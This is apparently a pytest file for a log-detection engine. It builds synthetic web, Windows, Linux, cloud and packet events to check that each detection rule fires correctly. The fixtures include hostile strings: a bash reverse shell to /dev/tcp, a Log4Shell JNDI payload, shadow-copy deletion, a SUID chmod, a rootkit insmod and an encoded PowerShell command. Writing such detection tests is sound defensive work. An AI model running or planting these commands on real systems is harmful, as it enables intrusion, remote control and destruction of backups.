"""The wider built-in catalogue: every new rule fires on the thing it describes, and only on that.

A rule that ships but never fires is worse than no rule — it reads as coverage. So each of these builds
the minimum event that should trip one rule and asserts that rule (not merely SOME rule) tagged it, plus
a negative pool that must stay clean. The point is not to re-test the engine; it is to pin that the
field names, event ids and regexes in the catalogue match what the PARSERS actually produce.
"""
from __future__ import annotations

import numpy as np
import pytest

from app.detect import RULES, run_rules
from app.models import Event


def _ev(i: int, source: str, msg: str, fields: dict, ts: str = "2026-05-01T14:00:00Z", raw: str = "") -> Event:
    return Event(id=f"e{i:x}", ts=ts, source=source, sourceId="s1", file="evidence.log",
                 host=fields.get("host", ""), user=fields.get("user", ""), msg=msg, sev="info",
                 raw=raw or msg, fields=fields)


def _run(events: list[Event]) -> dict[str, list[Event]]:
    """rule id -> the events it tagged."""
    ts = np.asarray([1777989600.0 + i for i in range(len(events))], dtype="float64")
    run_rules(events, ts)
    out: dict[str, list[Event]] = {}
    for e in events:
        for d in e.detections:
            out.setdefault(d.id, []).append(e)
    return out


def _fires(rid: str, events: list[Event]) -> list[Event]:
    hits = _run(events)
    assert rid in hits, f"{rid} did not fire on the evidence it exists for; got {sorted(hits)}"
    return hits[rid]


# --------------------------------------------------------------------- web
def test_webshell_and_jndi_and_long_paths() -> None:
    ev = [_ev(1, "nginx.access", "GET /uploads/shell.php", {"http.path": "/uploads/shell.php", "src_ip": "10.0.0.9"}),
          _ev(2, "nginx.access", "GET /?x=${jndi:ldap://evil/a}",
              {"http.path": "/?x=${jndi:ldap://evil/a}", "src_ip": "10.0.0.9"}),
          _ev(3, "nginx.access", "GET /long", {"http.path": "/a" + "B" * 1200, "src_ip": "10.0.0.9"})]
    hits = _run(ev)
    assert "SIGMA-WEB-0075" in hits and "SIGMA-WEB-0079" in hits and "SIGMA-WEB-0084" in hits


def test_a_normal_web_request_trips_nothing() -> None:
    ev = [_ev(i, "nginx.access", "GET /api/v2/products",
              {"http.path": "/api/v2/products", "http.status": "200", "src_ip": "198.51.100.4",
               "user_agent": "Mozilla/5.0 Chrome/126.0"})
          for i in range(40)]
    assert _run(ev) == {}, "ordinary traffic must not trip a rule"


def test_a_403_burst_is_forced_browsing() -> None:
    ev = [_ev(i, "nginx.access", "GET /admin", {"http.path": f"/admin/{i}", "http.status": "403",
                                                "src_ip": "198.51.100.44"}) for i in range(40)]
    assert _fires("SIGMA-WEB-0071", ev)


# --------------------------------------------------------------------- Windows
def test_password_spray_is_distinct_accounts_not_volume() -> None:
    """The rule this pins is the reason find_distinct_bursts exists: 12 failures against 12 DIFFERENT
    accounts is a spray, and 12 failures against one account is not."""
    spray = [_ev(i, "windows.evtx", "logon failure",
                 {"EventID": "4625", "IpAddress": "203.0.113.9", "TargetUserName": f"user{i}"})
             for i in range(12)]
    assert _fires("SIGMA-WIN-0170", spray)

    one = [_ev(i, "windows.evtx", "logon failure",
               {"EventID": "4625", "IpAddress": "203.0.113.9", "TargetUserName": "alice"})
           for i in range(12)]
    assert "SIGMA-WIN-0170" not in _run(one), "one account failing repeatedly is a lockout, not a spray"


def test_service_install_task_and_recovery_destruction() -> None:
    ev = [_ev(1, "windows.evtx", "service installed", {"EventID": "7045", "ServiceName": "evil"}),
          _ev(2, "windows.evtx", "task created", {"EventID": "4698", "TaskName": "\\Updater"}),
          _ev(3, "windows.evtx", "process create",
              {"EventID": "4688", "CommandLine": "vssadmin.exe delete shadows /all /quiet"}),
          _ev(4, "windows.evtx", "defender", {"EventID": "1116", "ThreatName": "Trojan:Win32/Test"})]
    hits = _run(ev)
    for rid in ("SIGMA-WIN-0175", "SIGMA-WIN-0180", "SIGMA-WIN-0185", "SIGMA-WIN-0160"):
        assert rid in hits, rid
    # That same 4688 also trips WIN-0133 (vssadmin is attacker tooling), which is correct and is why the
    # Windows branch uses independent `if`s rather than an elif chain. Read the detection by ID, not by
    # position, or this asserts against whichever rule happened to run first.
    e = hits["SIGMA-WIN-0185"][0]
    assert next(d for d in e.detections if d.id == "SIGMA-WIN-0185").level == "critical"
    assert {d.id for d in e.detections} >= {"SIGMA-WIN-0133", "SIGMA-WIN-0185"}


# --------------------------------------------------------------------- Linux
def test_reverse_shell_suid_and_kernel_module() -> None:
    ev = [_ev(1, "syslog", "cmd", {"program": "bash"}, raw="bash -i >& /dev/tcp/10.0.0.9/4444 0>&1"),
          _ev(2, "syslog", "cmd", {"program": "audit"}, raw="chmod u+s /usr/bin/find"),
          _ev(3, "syslog", "cmd", {"program": "kernel"}, raw="insmod /tmp/rootkit.ko"),
          _ev(4, "syslog", "cron", {"program": "cron"}, raw="wrote /etc/cron.d/backdoor")]
    hits = _run(ev)
    for rid in ("SIGMA-LNX-0060", "SIGMA-LNX-0070", "SIGMA-LNX-0075", "SIGMA-LNX-0065"):
        assert rid in hits, rid


# --------------------------------------------------------------------- cloud
def test_public_bucket_shared_image_and_disabled_security_service() -> None:
    ev = [_ev(1, "aws.cloudtrail", "PutBucketAcl", {"eventName": "PutBucketAcl", "user": "dev"},
              raw='{"eventName":"PutBucketAcl","grantee":"http://acs.amazonaws.com/groups/global/AllUsers"}'),
          _ev(2, "aws.cloudtrail", "ModifySnapshotAttribute",
              {"eventName": "ModifySnapshotAttribute", "user": "dev"},
              raw='{"eventName":"ModifySnapshotAttribute","attributeType":"createVolumePermission","add":{"group":"all"}}'),
          _ev(3, "aws.cloudtrail", "DeleteDetector", {"eventName": "DeleteDetector", "user": "dev"})]
    hits = _run(ev)
    for rid in ("SIGMA-AWS-0080", "SIGMA-AWS-0090", "SIGMA-AWS-0095"):
        assert rid in hits, rid


def test_kubernetes_cluster_admin_and_anonymous() -> None:
    ev = [_ev(1, "k8s.audit", "create binding",
              {"resource": "clusterrolebindings", "verb": "create", "user": "dev"},
              raw='{"roleRef":{"name":"cluster-admin"}}'),
          _ev(2, "k8s.audit", "get pods", {"resource": "pods", "verb": "list", "user": "system:anonymous"})]
    hits = _run(ev)
    assert "SIGMA-K8S-0030" in hits and "SIGMA-K8S-0035" in hits


# --------------------------------------------------------------------- packet captures
def test_capture_rules_read_the_fields_the_pcap_parser_produces() -> None:
    """These field names are the contract between app/parsers/pcap.py and the catalogue."""
    tunnel = "a" * 48 + ".exfil.example.com"
    ev = [_ev(1, "network.pcap", f"DNS query {tunnel}",
              {"dns_query": tunnel, "dns_qr": "query", "src_ip": "10.0.0.5", "protocol": "UDP"}),
          _ev(2, "network.pcap", "TLS client hello c2.duckdns.org",
              {"tls_sni": "c2.duckdns.org", "dst_port": "443", "protocol": "TCP", "src_ip": "10.0.0.5"}),
          _ev(3, "network.pcap", "TCP 10.0.0.5:52344 > 10.0.0.9:23",
              {"dst_port": "23", "protocol": "TCP", "payload_len": "40", "src_ip": "10.0.0.5"}),
          _ev(4, "network.pcap", "TLS client hello on 8081",
              {"tls_sni": "cdn.example.net", "dst_port": "8081", "protocol": "TCP", "src_ip": "10.0.0.5"})]
    hits = _run(ev)
    for rid in ("SIGMA-PCAP-0010", "SIGMA-PCAP-0022", "SIGMA-PCAP-0018", "SIGMA-PCAP-0030"):
        assert rid in hits, rid


def test_a_syn_scan_counts_distinct_ports() -> None:
    ev = [_ev(i, "network.pcap", "syn", {"tcp_flags": "SYN", "src_ip": "203.0.113.9",
                                         "dst_port": str(1000 + i), "protocol": "TCP"})
          for i in range(60)]
    hit = _fires("SIGMA-PCAP-0026", ev)
    assert "different ports" in hit[0].msg


def test_ordinary_https_traffic_is_not_flagged() -> None:
    ev = [_ev(i, "network.pcap", "TLS client hello www.example.com",
              {"tls_sni": "www.example.com", "dst_port": "443", "protocol": "TCP", "src_ip": "10.0.0.5",
               "tcp_flags": "PSH,ACK"})
          for i in range(50)]
    assert _run(ev) == {}


# --------------------------------------------------------------------- any source
def test_secrets_encoded_commands_and_ransomware_are_found_in_any_source() -> None:
    ev = [_ev(1, "app.jsonl", "config loaded", {}, raw='{"aws_key":"AKIAIOSFODNN7EXAMPLE"}'),
          _ev(2, "delimited", "cmd", {}, raw="powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA"),
          _ev(3, "text", "file", {}, raw="C:\\Users\\bob\\Desktop\\HOW_TO_DECRYPT.txt")]
    hits = _run(ev)
    for rid in ("SIGMA-APP-0070", "SIGMA-APP-0075", "SIGMA-APP-0080"):
        assert rid in hits, rid


def test_the_any_source_pass_is_skipped_when_those_rules_are_off() -> None:
    """A disabled rule must not cost a scan of the evidence — the pass is the one that touches every
    event, so 'it does nothing' is not good enough."""
    ev = [_ev(1, "app.jsonl", "config", {}, raw='{"aws_key":"AKIAIOSFODNN7EXAMPLE"}')]
    ts = np.asarray([1.0])
    run_rules(ev, ts, disabled={"SIGMA-APP-0070", "SIGMA-APP-0075", "SIGMA-APP-0080"})
    assert not ev[0].detections


# --------------------------------------------------------------------- shape of the catalogue
def test_every_rule_id_is_unique_and_prefixed() -> None:
    ids = [r.id for r in RULES]
    assert len(ids) == len(set(ids))
    assert all(i.startswith("SIGMA-") for i in ids)


@pytest.mark.parametrize("family", ["WEB", "AUTH", "WIN", "LNX", "AWS", "K8S", "MAIL", "PCAP", "APP", "NET"])
def test_each_family_is_represented(family: str) -> None:
    assert any(r.id.startswith(f"SIGMA-{family}-") for r in RULES), f"no {family} rules in the catalogue"
